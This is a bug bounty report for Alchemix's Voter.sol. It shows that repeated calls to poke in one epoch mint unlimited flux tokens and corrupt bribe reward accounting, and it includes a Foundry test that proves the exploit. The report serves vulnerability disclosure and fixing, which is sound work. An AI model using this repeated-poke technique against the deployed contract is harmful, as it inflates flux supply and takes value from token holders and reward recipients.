# 31483 - \[SC - Critical] Users can vote multiple times in one epoch

Submitted on May 20th 2024 at 05:58:18 UTC by @MahdiKarimi for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31483

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
* Theft of unclaimed yield

## Description

## Brief/Intro

Users can mint unlimited flux by calling `poke` multiple times

## Vulnerability Details

The vote function at voter uses onlyNewEpoch modifier so users can vote only once per epoch and receive flux tokens, however, the `poke` function that applies voting in the last epoch to the current epoch doesn't use this modifier and user can call it multiple times in one epoch and receive unlimited flux also, every time `_vote` function is called in `poke`, it resets the last voting and calls deposit at the bribe which inflates total voting at bribe so distributed rewards to bribe would be lost ( total voting used to calculate amount of rewards has been distributed per token )

## Impact Details

Minting unlimited flux tokens leads flux price to 0 ( Direct theft of any user funds, whether at rest or in motion, other than unclaimed yield ) , the flux token is used as a reward for users but it's an ERC20 and can be traded in markets ( has some utilities ) so minting unlimited flux affects all flux holders ( not just rewarded users ) and leads to the loss of their assets that's why I believe it's considered direct theft of user funds.

Loss of distributed rewards at underlying bribes

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/Voter.sol#L195-L212>

## Proof of Concept

```
function testVoteWithoutLimit() external {

        // create lock token for user 
        uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, veALCX.MAXTIME(), false);

        // calculate the amount flux tokens that user should be able to claim in this epoch 
        uint256 token1Flux = veALCX.claimableFlux(tokenId1);

        // assert user has no unclaimed flux 
        uint256 unclaimedFlux1Start = flux.getUnclaimedFlux(tokenId1);
        assertEq(unclaimedFlux1Start, 0, "should start with no unclaimed flux");


        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 5000;

        // vote and calling poke multiple times 
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        hevm.prank(admin);
        voter.poke(tokenId1);
        hevm.prank(admin);
        voter.poke(tokenId1);
        hevm.prank(admin);
        voter.poke(tokenId1);
        hevm.prank(admin);
        voter.poke(tokenId1);
        hevm.prank(admin);
        voter.poke(tokenId1);

        // as we see user has received 6 times more rewards as we called poke multiple times
        uint256 actualFluxClaimed = 6 * token1Flux;
        uint256 unclaimedFlux1End = flux.getUnclaimedFlux(tokenId1);
        assertEq(actualFluxClaimed, unclaimedFlux1End);

    }
```
